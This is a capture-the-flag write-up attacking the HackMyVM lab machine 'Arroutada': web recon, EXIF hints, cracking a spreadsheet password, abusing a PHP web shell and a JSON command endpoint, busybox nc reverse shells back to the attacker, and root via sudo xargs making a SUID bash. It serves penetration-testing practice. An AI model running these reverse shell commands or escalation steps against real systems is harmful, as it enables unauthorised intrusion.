# Arroutada

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.184:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.184
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/arroutada/writeup.png)

### Fuzzing

```bash
‚îî‚îÄ$ feroxbuster -u http://10.0.2.184 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET        5l        3w       59c http://10.0.2.184/
301      GET        9l       28w      307c http://10.0.2.184/imgs => http://10.0.2.184/imgs/
200      GET        5l        3w       59c http://10.0.2.184/index.html
```

```bash
‚îî‚îÄ$ curl -LOs http://10.0.2.184/imgs/apreton.png
‚îî‚îÄ$ exiftool  apreton.png
...
Title                           : {"path": "/scout"}
...
```

```bash
‚îî‚îÄ$ curl http://10.0.2.184/scout/ -s | grep -v '^$'
<div>
<p>
Hi, Telly,
<br>
<br>
I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
<br>
/scout/******/docs/
<br>
<br>
With continued gratitude,
<br>
J1.
</p>
</div>
<!-- Stop please -->
<!-- I told you to stop checking on me! -->
<!-- OK... I'm just J1, the boss. -->
```

```bash
‚îî‚îÄ$ ffuf -u 'http://10.0.2.184/scout/FUZZ/docs' -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -fs 1131
j2                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 22ms]
```

```bash
‚îî‚îÄ$ wget -m -np -nH -R "index.html*" http://10.0.2.184/scout/j2/docs/
‚îî‚îÄ$ cd scout/j2/docs
‚îî‚îÄ$ find . -empty -delete
‚îî‚îÄ$ cat z206
Ignore z*, please
Jabatito

‚îî‚îÄ$ cat pass.txt
user:password

‚îî‚îÄ$ open shellfile.ods
```

### Document Password

![writeup-1.png](/assets/pentest/hackmyvm/arroutada/writeup-1.png)

```bash
‚îî‚îÄ$ libreoffice2john shellfile.ods
shellfile.ods:$odf$*1*1*100000*32*b6faccf504c29e07398b10e3145afe6bebc7748bfdbc47986f32136f51661a7b*16*23e0328760785d4860d792544a5d898c*16*c6a419ad516f22a5c0f91ea1cbf584ed*0*622bdd7aa97ec525a89a952afe1f654c1fd8d9f0d86950dba3cc0f10c76ec62774a76d54d4b69a4e0f2cfa64eba0e30b04479327bb9aedf16e0570632a4bba5893e7313a8940a94d315a6a4ead6946b96a82a6eb8b3a6f9bf84a9c5fedd8a7a8f907ba1a92f05571583269bc02931604da7bffd35c5b403bf56a0a96197035b61cd93337649dec1120b9d28f66dcf1247d17a423eaed223e9eed7d7c38e094e2a5997ea1e6c22c82c9c84bdc9006b6c2b73ad8cced6eb47ac45850c333bba8f6bc7344422a85a6787d3ade2501a2f80789c68408f6b484635c6d458af36caab2c00316fc2ae6b0e3bb09138e73e03c5493ea483e9029348f8c4a47bd25cbcc252c62e68ebd308f2285dbca0e28b6738506edeae5a2731e066f8419b49302f9c816730a6d514e64728977655bb8764fdf9d7fc5752cc1b7968cc8cb2aba779646156a2b7923ded336db7aea16c3d3eb1fde9170480cd3d864be85bd14aa46aad08f34916e67f5add14614386f9ae34cc7ebe09ac8820afb42b09d16c026f5fcde4b75e8128b4dd6558d655356d4d5adbcd7b4e0b0753dd54cb1b7104b04638ccb8dd7b13790503af56228970e8693db959c3ab2b516fd1122b471137a4da8942fe346e557dd6f978d2cfaca1ff472bf585a3b46ee7539f895e15780b948464339702cf2ccf15f4c3f45eb705031a636eb64fad0064b11e03eff21dca2bb344e1480266a456e992f4c023a95e66de6dab2a680f2855ff0dade5bfdcbeb13c458ff64c2fe9fe6f03e7296f52a0bfb4d16555f75b2e761e9bc73e56387b94655ebbd76fe860bccde2cbb0672ceb69d4d532ee6eaf94f7a1f82c93bec1117c4c1f93fdf3d06dd152c2773db43c6ceae4a3703d03c81e00160929d6663a12ca911cb4ead204a71dc0e83a4c3a06dfd579e30a7a84d2c06d66c9d903534398a700f82fbdf319e9684774b7e00a4d7dbdedd97d1a1fe6e535e0366d0c5d4920acb95fa9af70c04d1a271f80fd2d5c60e3d52b6423a3637ad9665aab829ad04ee2066ba006889e6e6e62628efa6c266c14cf614ff9bb8b7dce9c07bb710b18b638b0e2033530048bf2745b8624f529b2a5bccda4a530326594ccffe3c457ae657a9b1f7fab0e8295817b4aecc63e29b92daf824c50b968da5eaeea02cdaa6c74a3a7891d8c24a5f66ee7623c7889f9335bb3bc3e4f2b39c9cc21ed78eede60e8af713174489aca596702bccc87552d176d033ee0cb34620730f380c8cbbf54c6f0061de7b8c71752e2d999fc79b8dcffc612b62d3d2b921684ef6d7f043a82b3413f081a454b93f3ee18ad15c0da2d3bd92fd1311d9e550e9e95ac4181451664bb3179cc38969d24cff5de21ec636e2559f0d4807937a255fdb1c1c534717fbf375c407788efc1d133e9d66a29553fd5c9fd489b2ad3e1b838cf41ec18a8a9bd0b01483e8:::::shellfile.ods
```

```powershell
PS> john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt --rules=Arroutada
john11           (shellfile.ods)
```

![writeup-2.png](/assets/pentest/hackmyvm/arroutada/writeup-2.png)

### RCE

```bash
‚îî‚îÄ$ ffuf -u 'http://10.0.2.184/thejabasshell.php?FUZZ=id' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 0
a                       [Status: 200, Size: 33, Words: 5, Lines: 1, Duration: 2ms]
```

```bash
‚îî‚îÄ$ curl 'http://10.0.2.184/thejabasshell.php?a=id'
Error: Problem with parameter "b" 
```

```bash
‚îî‚îÄ$ ffuf -u 'http://10.0.2.184/thejabasshell.php?a=id&b=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 0,33
pass                    [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 87ms]
```

```bash
‚îî‚îÄ$ curl 'http://10.0.2.184/thejabasshell.php?a=id&b=pass'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
‚îî‚îÄ$ curl 'http://10.0.2.184/thejabasshell.php?b=pass' -G --data-urlencode 'a=busybox nc 10.0.2.149 4444 -e /bin/bash'
---
‚îî‚îÄ$ penelope -p 4444
www-data@arroutada:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

```bash
www-data@arroutada:/tmp$ ss -tunlp4
Netid   State    Recv-Q   Send-Q       Local Address:Port       Peer Address:Port   Process
udp     UNCONN   0        0                  0.0.0.0:68              0.0.0.0:*
tcp     LISTEN   0        4096             127.0.0.1:8000            0.0.0.0:*
```

```bash
www-data@arroutada:/var/www/html$ cd /tmp
www-data@arroutada:/tmp$ wget -qO- 0:8000
<h1>Service under maintenance</h1>


<br>


<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>

<!-- Please sanitize /priv.php -->
```

![writeup-3.png](/assets/pentest/hackmyvm/arroutada/writeup-3.png)

```bash
www-data@arroutada:/tmp$ wget -qO- 0:8000/priv.php
Error: the "command" parameter is not specified in the request body.
/*
$json = file_get_contents('php://input');
$data = json_decode($json, true);
if (isset($data['command'])) { system($data['command']); } 
else { echo 'Error: the "command" parameter is not specified in the request body.'; }
*/
```

```bash
www-data@arroutada:/tmp$ wget -qO- 0:8000/priv.php --post-data='{"command":"id"}' | head -1
uid=1001(drito) gid=1001(drito) groups=1001(drito)
```

```bash
www-data@arroutada:/tmp$ wget -qO- 0:8000/priv.php --post-data='{"command":"busybox nc 10.0.2.149 4444 -e /bin/bash"}'
[+] Got reverse shell from arroutada~10.0.2.184-Linux-x86_64 üòçÔ∏è Assigned SessionID <3>
[!] Session detached ‚á≤ # F12
(Penelope)‚îÄ(Session [1])> sessions 3
drito@arroutada:~$ id
uid=1001(drito) gid=1001(drito) groups=1001(drito)
```

### User.txt

```bash
drito@arroutada:~$ cat user.txt
785f64437c6e1f9af6aa1afcc91ed27c
```

## Privilege Escalation

```bash
drito@arroutada:~$ sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs
```

```bash
drito@arroutada:~$ echo x | sudo xargs sh -c 'install -m4777 /bin/bash /tmp/rootbash'
drito@arroutada:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1001(drito) gid=1001(drito) euid=0(root) groups=1001(drito)
```

### Root.txt

```bash
### Not a flag
rootbash-5.1# cat /root/root.txt
R3VuYXhmR2JGenlOYXFOeXlVbnB4WmxJWg==

### Not a flag
rootbash-5.1# cat /root/root.txt  | base64 -d ;echo
GunaxfGbFzyNaqNyyUnpxZlIZ
```

![writeup-4.png](/assets/pentest/hackmyvm/arroutada/writeup-4.png)

```bash
ThanksToSmlAndAllHackMyVM
```